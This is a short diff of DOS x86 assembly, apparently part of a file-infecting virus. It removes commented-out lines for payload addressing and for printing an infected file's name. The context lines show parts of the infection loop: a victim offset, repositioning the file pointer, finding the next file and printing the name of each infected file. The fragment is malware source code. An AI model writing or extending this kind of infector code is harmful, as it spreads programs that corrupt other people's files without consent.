@@ -67,12 +67,6 @@ file_err_skip:
     ; add ax, 100h
     add ax, 1
     mov [bp + victim_bp], ax
-
-    ; ; preparing payload addressation
-    ; mov al, [bp + payload_offset]
-    ; mov ah, 0
-    ; add ax, 107h
-    ; sub ax, [bp + offset code]
     
     ; moving carret to the start
     mov cx, 0
@@ -101,16 +95,6 @@ find_next:
     jmp file_open
 
 find_next_skip:
-
-    ; ; old output infected filename
-    ; mov al, '$'
-    ; mov file.fname[12], al
-    ; push dx
-    ; lea dx, [bp + file.fname]
-    ; mov ah, 09h
-    ; int 21h
-    ; pop dx
-    ; mov [bp + file.fname[12]], 0
 
     ; output infected filename
     lea dx, [bp + file.fname]
